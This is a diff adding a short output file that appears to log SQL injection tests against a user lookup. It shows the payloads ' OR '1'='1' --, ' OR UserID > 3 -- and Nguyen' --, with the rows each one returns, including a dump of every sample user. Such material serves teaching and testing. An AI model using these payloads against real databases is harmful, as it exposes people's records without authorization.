@@ -1,0 +1,22 @@
+=== Results for input: Nguyen Van An ===
+1 | Nguyen Van An
+=== End ===
+=== Results for input: ' OR '1'='1' --  ===
+1 | Nguyen Van An
+2 | Tran Thi Bich
+3 | Le Van Cuong
+4 | Pham Thi Dung
+5 | Hoang Van Em
+6 | Dr. Minh Tuan
+7 | Dr. Lan Anh
+8 | Dr. Thanh Hung
+=== End ===
+=== Results for input: ' OR UserID > 3 --  ===
+4 | Pham Thi Dung
+5 | Hoang Van Em
+6 | Dr. Minh Tuan
+7 | Dr. Lan Anh
+8 | Dr. Thanh Hung
+=== End ===
+=== Results for input: Nguyen' --  ===
+=== End ===
